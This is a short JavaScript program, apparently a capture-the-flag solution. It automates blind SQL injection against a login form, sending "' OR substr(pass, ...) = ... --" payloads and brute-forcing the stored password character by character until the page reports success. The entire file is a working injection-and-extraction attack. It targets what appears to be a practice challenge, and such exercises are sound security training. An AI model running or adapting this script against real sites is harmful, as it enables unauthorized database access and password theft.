import axios from 'axios';
import FormData from 'form-data';

const sleep = async ms => {
  return new Promise(r => setTimeout(r, ms));
};

const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$&\'()-^\@[;:],./\=~|`{+*}<>?_%';

let flag = 'FLAG_';
for (let i = 0; i < 100; i++) {
  let ok = false;
  for (const ch of chars) {
    const form = new FormData();
    form.append('id', `' OR substr(pass, 1, ${flag.length + 1}) = '${flag + ch}' --`);
    const response = await axios
      .post('https://ctfq.u1tramarine.blue/q6/', form, {
        headers: form.getHeaders()
      });
    if (response.data.match(/Congratulations/)) {
      flag += ch;
      console.log(flag);
      ok = true;
      break;
    }
    await sleep(1000);
  }
  if (!ok) {
    break;
  }
}

console.log(flag);
